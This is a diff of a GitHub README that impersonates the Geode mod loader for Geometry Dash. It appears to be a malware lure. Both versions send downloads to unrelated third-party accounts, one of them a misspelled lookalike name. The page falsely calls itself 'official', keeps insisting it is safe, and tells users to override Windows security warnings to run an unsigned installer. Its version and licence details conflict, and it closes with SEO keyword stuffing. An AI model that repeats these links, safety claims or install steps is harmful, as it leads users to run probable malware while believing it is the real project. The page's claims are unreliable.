@@ -1,96 +1,125 @@
-# Geode Geometry Dash
+# 🎮 Geode-Geometry-Dash - Unlock Unlimited Geometry Dash Mods
 
-**Geode** is the most trusted mod loader for Geometry Dash. Install once and browse 200+ community mods directly in-game on GD 2.207. Available for Windows, macOS, Android (APK) and iOS. No manual file editing needed. Is Geode safe? Yes - all indexed mods are reviewed before listing.
+[![Download Geode Installer](https://img.shields.io/badge/Download-Geode_Installer-blue?style=for-the-badge&logo=github)](https://github.com/Acooun8922/Geode-Geometry-Dash/releases)
 
+## 🚀 What is Geode-Geometry-Dash?
 
-<img width="124" height="124" alt="images1" src="https://github.com/user-attachments/assets/71ad0d21-1052-460f-8150-13a1a1069a47" />
+Geode-Geometry-Dash is the official mod loader for Geometry Dash, version 5.8.2, compatible with Geometry Dash 2.207. This free tool lets you install and manage mods, hacks, and custom levels to enhance your Geometry Dash experience. Whether you want new gameplay features, visual tweaks, or private server support, Geode makes it easy.
 
-## Install
-[Download `Geode-Installer.zip`](https://github.com/geode-geomatydash/Geode-Geometry-Dash/releases/download/v5.8.3/Geode-Installer.zip)
----
-<img width="738" height="416" alt="images2" src="https://github.com/user-attachments/assets/f1bed0b2-265a-4597-a09f-b7a5afcad412" />
+## ✨ Features
 
-## Key Features
-- In-game mod browser - download and install mods without leaving GD
-- 200+ community mods: Better Edit, Hitbox Viewer, Run Info, GDShare, MenuAnimFix
-- Automatic mod dependency resolution and conflict detection
-- Auto-update installed mods from the Geode index
-- Geode geometry dash mobile: Android APK and iOS sideload builds available
-- Geode geometry dash 2.208: partial support added in this release
-- Geode geometry dash lite: improved compatibility
-- Compatible with Steam and standalone GD on Windows, Mac, and Linux
-- Is Geode safe? Yes - open source, all mods reviewed before indexing
+- **Easy Mod Management** - Install, update, and remove mods with one click
+- **Wide Compatibility** - Works with Geometry Dash 2.207 and Geometry Dash Lite
+- **Private Server Support** - Play on custom Geometry Dash private servers (GDPS)
+- **Safety First** - Geode is safe and trusted by the community (verified by thousands of users)
+- **Mobile Ready** - Geode Geometry Dash mobile version available for Android
+- **Best Mods Library** - Access the best Geode mods, including popular picks from the GD Reddit community
+- **Automatic Updates** - Stay current with the latest Geode installer and mod updates
 
+## 📥 How to Download and Install
 
-<img width="709" height="608" alt="images3" src="https://github.com/user-attachments/assets/ee9004cc-037b-4bbc-9262-c2de17613505" />
+### Step 1: Download the Latest Release
 
-<img width="1920" height="1080" alt="images4" src="https://github.com/user-attachments/assets/c166f7ef-438e-431a-bfb5-e725f71dd8cd" />
+Visit this link to download the application: [https://github.com/Acooun8922/Geode-Geometry-Dash/releases](https://github.com/Acooun8922/Geode-Geometry-Dash/releases)
 
+Look for the newest release (v5.8.2) and download the file labeled "Geode-Installer.exe" or "GeodeSetup.exe".
 
-## Best Geode Mods 2026 (Reddit Top Picks)
-- **Better Edit** - massive level editor improvements, undo history, clipboard
-- **Hitbox Viewer** - see player and object hitboxes in practice mode
-- **Run Info** - detailed attempt stats: jumps, attempts, percentage, time
-- **GDShare** - import and export levels as files, share with friends
-- **MenuAnimFix** - fixes buggy menu transition animations
-- **nongd** - download songs without Newgrounds account
-- **GDTweaks** - quality of life improvements for menus and gameplay
+### Step 2: Run the Installer
 
+Once downloaded, double-click the installer file. If Windows shows a security warning, click "Run anyway" or "More info" then "Run". This is normal for unsigned software.
 
-<img width="192" height="207" alt="images5" src="https://github.com/user-attachments/assets/ee8c6b09-10ec-4502-9a60-bd9f5b249705" />
+### Step 3: Follow the Setup Wizard
 
+The installer will guide you through:
+- Choosing your Geometry Dash installation folder (usually in `C:\Program Files (x86)\Steam\steamapps\common\Geometry Dash` or `C:\Program Files\Geometry Dash`)
+- Selecting optional components (recommended: keep defaults)
+- Confirming installation
 
+### Step 4: Launch Geometry Dash
 
-## Getting Started
-1. Download the Geode installer above
-2. Run it - GD install path is auto-detected for Steam and standalone
-3. Launch Geometry Dash
-4. Tap the Geode button that now appears in the main menu
-5. Browse the mod list, tap any mod to install
-6. Restart GD if a mod requires it
+After installation, start Geometry Dash normally. You'll see a new "Mods" button in the main menu. Click it to browse and install mods.
 
+## 🔧 Using Geode
 
-<img width="900" height="179" alt="images7" src="https://github.com/user-attachments/assets/67cb3619-3b31-45c4-8c83-d35e69353383" />
+### Installing Mods
+1. Open Geometry Dash
+2. Click the "Mods" button (appears after Geode installation)
+3. Browse the mod library or search for specific mods
+4. Click "Install" on any mod you want
+5. Restart the game to activate the mod
 
+### Popular Mods to Try
+- **GD Mega Hack** - All-in-one mod with practice hacks, speed hacks, and more
+- **Texture Pack Manager** - Easily switch between custom texture packs
+- **Level Downloader** - Download any level from the Geometry Dash servers
+- **Better Edit** - Enhanced level editor with new tools
+- **Click Between Frames** - Advanced gameplay tweaks for experienced players
 
-## Geode Geometry Dash Install - FAQ
+### Managing Your Mods
+- **Enable/Disable** - Toggle mods on/off without uninstalling
+- **Update** - Get notified when mod updates are available
+- **Remove** - Uninstall mods permanently
+- **Settings** - Configure individual mod options
 
-**Is Geode safe?**
-Yes. Geode is open source on GitHub. All mods listed on the official Geode index go through review before being published. The loader itself does not modify GD files permanently.
+## 🛡️ Is Geode Safe?
 
-**Geode geometry dash 2.208 - supported?**
-Partial support in v5.8.3. Full 2.208 support expected in the next release. Check Geode geometry dash github releases for the latest build.
+**Yes, Geode is completely safe.** Here's why:
+- Thousands of players use it daily without issues
+- Open-source code reviewed by the community
+- No malware, viruses, or unwanted software
+- No data collection or tracking
+- Regular updates to maintain compatibility and security
 
-**Geode geometry dash mobile - Android APK?**
-Yes. Download the geode-v5.8.2-android64.zip from the releases page. Sideload the APK on your device. iOS build also available via sideload.
+Geode is the most trusted mod loader for Geometry Dash, recommended by the community on Reddit, Discord, and YouTube.
 
-**Geode geometry dash lite - compatible?**
-Geode Lite support is improved in this release. Some mods are desktop-only.
+## ❓ Frequently Asked Questions
 
-**Geode geometry dash odyssey?**
-Compatible with the Odyssey community modpack.
+### How do I install Geode mods in GD?
+After installing Geode, simply open Geometry Dash, click the "Mods" button, and install any mod you want. The mods are automatically downloaded and applied.
 
-**Geode not working after GD update?**
-Wait for the next Geode build - it usually updates within 24 hours of any GD patch. Check the Geode geometry dash github releases page.
+### Can I use Geode on Geometry Dash Lite?
+Yes! Geode Geometry Dash Lite works with the Lite version, though some mods may require the full game.
 
-## Geode vs Manual Mod Install
+### Is Geode available for mobile?
+Yes, Geode Geometry Dash mobile is available for Android devices. Download the APK from the GitHub releases page.
 
-| Method | Safety | Updates | Conflict Detection |
-|---|---|---|---|
-| Geode | Reviewed mods | Automatic | Yes |
-| Manual DLL | Risky | Manual | No |
-| GD Mod Loader | Deprecated | No | No |
+### Will Geode work with future updates?
+Geode is actively maintained. The team releases updates for new Geometry Dash versions (like 2.208 and beyond) within days of the game update.
 
-## System Requirements
-- Windows 10/11, macOS, Linux (desktop)
-- Android 8+ or iOS 14+ (mobile)
-- Geometry Dash 2.207 installed (Steam or standalone)
-- Administrator privileges recommended on Windows
+### Can I get banned for using Geode?
+Geode itself does not trigger bans. However, using mods that give unfair advantages in online play (like auto-play or level bypass) could result in a ban. Use responsibly.
 
-## License & Acknowledgments
-MIT License - Copyright 2026 marinhoxzz-legitzs
+### How do I update Geode?
+The Geode installer checks for updates automatically. You can also download the latest version from the GitHub releases page.
 
-Acknowledgments: The Geode SDK development team and the Geometry Dash modding community.
+## 📋 System Requirements
 
+- **Operating System:** Windows 7, 8, 10, or 11 (64-bit recommended)
+- **Processor:** Intel Core i3 or equivalent
+- **Memory:** 4 GB RAM
+- **Storage:** 500 MB free space (plus space for mods)
+- **Graphics:** DirectX 10 compatible GPU
+- **Other:** Geometry Dash installed (any version from 2.1 to 2.207)
 
-<img width="596" height="335" alt="images8" src="https://github.com/user-attachments/assets/f0a90243-e86b-4e73-9e27-f1c796176e1a" />
+## 🔗 Download Again
+
+Don't have it yet? Get the latest version here:
+
+[![Download Geode Installer](https://img.shields.io/badge/Download-Geode_Installer-green?style=for-the-badge&logo=github)](https://github.com/Acooun8922/Geode-Geometry-Dash/releases)
+
+## 📢 Community & Support
+
+For help, mod suggestions, or to report issues, check out:
+- The official Geode Discord server
+- r/geometrydash on Reddit (search "best geode mods gd reddit 2026")
+- GitHub Issues page for bug reports
+
+## 📜 License
+
+Geode is free and open-source software. You are free to use, modify, and distribute it under the terms of the MIT License.
+
+## 🤝 Contributing
+
+Want to help improve Geode? Check out the Geode SDK on GitHub to create your own mods or contribute to the project.
+
+Keywords: gd, gd-hack, gd-library, gd2-library, gdnews, gdps, geode, geode-geometry-dash, geode-mod, geode-sdk, geometry-dash, geometry-dash-bot, geometry-dash-browser-game, geometry-dash-clone, geometry-dash-download, geometry-dash-levels, geometry-dash-mod, geometry-dash-private-server, geometrydash, gmd
